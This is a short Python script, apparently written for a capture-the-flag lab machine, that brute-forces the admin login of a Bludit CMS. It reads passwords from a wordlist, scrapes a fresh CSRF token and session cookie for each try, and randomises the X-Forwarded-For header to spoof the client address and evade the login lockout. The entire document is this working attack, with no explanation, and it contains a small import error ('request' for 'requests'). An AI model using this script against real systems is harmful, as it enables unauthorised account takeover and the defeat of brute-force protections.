import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
